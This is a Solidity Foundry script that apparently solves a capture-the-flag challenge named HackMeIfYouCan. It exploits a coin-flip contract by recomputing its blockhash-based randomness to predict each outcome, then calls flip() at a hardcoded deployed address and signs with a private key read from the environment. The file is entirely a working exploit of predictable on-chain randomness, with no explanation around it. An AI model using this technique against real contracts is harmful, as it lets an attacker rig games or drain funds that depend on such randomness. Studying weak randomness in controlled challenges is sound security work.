// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {HackMeIfYouCan} from "../src/HackMeIfYouCan.sol";

contract FlipScript is Script {
    HackMeIfYouCan public hackMeIfYouCan;
    uint256 FACTOR = 6275657625726723324896521676682367236752985978263786257989175917;

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        hackMeIfYouCan = HackMeIfYouCan(payable(0x9D29D33d4329640e96cC259E141838EB3EB2f1d9));

        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        hackMeIfYouCan.flip(side);

        console.log("Marks after flip:", hackMeIfYouCan.getMarks(tx.origin));
        vm.stopBroadcast();
    }
}
